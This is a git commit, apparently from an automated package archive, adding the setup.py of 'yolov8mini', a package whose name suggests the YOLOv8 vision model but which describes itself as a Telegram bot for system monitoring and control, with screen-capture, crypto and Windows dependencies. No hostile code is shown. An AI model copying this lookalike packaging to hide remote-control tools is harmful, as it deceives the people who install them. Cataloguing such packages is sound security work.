f0405f9ece99df526cac188eaa427539c2a0012e
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-03-24 03:17:25 +0000

    Add package yolov8mini/2.0.1/yolov8mini-2.0.1.tar.gz

---
+++ packages/yolov8mini/yolov8mini-2.0.1.tar.gz/yolov8mini-2.0.1/setup.py
@@ -0,0 +1,33 @@
+from setuptools import setup, find_packages
+
+setup(
+    name="yolov8mini",
+    version="2.0.1",
+    packages=find_packages(),
+    install_requires=[
+    "pytelegrambotapi",
+    "opencv-python",
+    "numpy",
+    "pyautogui",
+    "pillow",
+    "pycryptodome",
+    "pypiwin32"
+],
+    entry_points={
+        "console_scripts": [
+            "yolov8mini = yolov8mini.bot:run_bot"
+        ]
+    },
+    author="Tintumon",
+    author_email="",
+    description="A Telegram bot for system monitoring and control.",
+    long_description=open("README.md").read(),
+    long_description_content_type="text/markdown",
+    url="https://github.com/appuachu",
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
+    ],
+    python_requires=">=3.6",
+)
